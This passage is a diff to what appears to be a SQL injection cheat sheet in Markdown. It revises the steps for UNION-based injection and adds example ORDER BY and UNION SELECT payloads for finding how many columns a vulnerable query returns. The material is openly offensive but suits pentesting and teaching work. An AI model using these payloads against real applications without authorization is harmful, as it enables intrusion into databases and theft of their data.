@@ -175,11 +175,15 @@ Columns | column_name FROM all_tab_columns
 
 > **SQL Injection Union**
 
-Once you have identified SQL injection, use order by (increase until it breaks):
+Once you have identified SQL injection, use order by or UNION select to determine the number of columns:
 {% highlight sql %}
 dent' and 'a'='a' ORDER BY 1; #
-...
+...until it breaks
 dent' and 'a'='a' ORDER BY 5; #
+
+Dent' UNION SELECT  '1'; #
+..until it works
+Dent' UNION SELECT  '1', '2', '3', '4'; #
 {% endhighlight %}
  See which fields (e.g., numbers) are visable in the output. 
 {% highlight sql %}
